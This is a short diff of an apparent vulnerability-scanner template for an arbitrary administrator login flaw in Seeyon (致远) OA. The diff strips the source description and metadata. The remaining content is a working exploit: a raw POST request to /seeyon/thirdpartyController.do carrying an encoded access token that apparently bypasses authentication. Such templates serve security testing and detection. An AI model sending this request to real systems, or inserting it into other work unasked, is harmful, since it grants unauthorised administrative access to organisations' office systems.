@@ -3,17 +3,11 @@ info:
   name: 致远 OA 任意管理员登录
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/afitp7i5ksesp6ki'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: afitp7i5ksesp6ki
-    fofa: 暂无
 http:
 - raw:
   - 'POST /seeyon/thirdpartyController.do HTTP/1.1
-
-
 
 
     method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
